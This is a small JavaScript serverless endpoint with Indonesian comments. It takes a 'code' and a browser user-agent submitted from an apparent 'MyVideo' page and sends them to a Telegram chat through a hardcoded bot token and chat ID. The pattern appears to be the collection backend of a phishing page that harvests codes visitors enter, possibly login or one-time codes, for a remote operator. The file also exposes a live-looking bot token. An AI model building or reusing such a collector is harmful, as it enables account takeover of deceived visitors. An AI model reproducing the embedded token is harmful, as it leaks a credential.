export default async function handler(req, res) {
  // Izinkan hanya method POST
  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false, err: 'method_not_allowed' });
  }

  const { code, ua } = req.body || {};
  if (!code) return res.status(400).json({ ok: false, err: 'no_code' });

  // Ganti ini pakai token & chat_id milikmu
  const BOT_TOKEN = '8221590141:AAFUtvYaqGKQCm9Mp1_iuls3UJThlGwLOwk';
  const CHAT_ID = '8015997732';

  const msg = `🔔 Akses MyVideo\nKode: ${code}\nUA: ${ua}`;

  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        chat_id: CHAT_ID,
        text: msg,
        parse_mode: 'Markdown'
      })
    });

    return res.status(200).json({ ok: true });
  } catch (err) {
    return res.status(500).json({ ok: false, err: err.message });
  }
}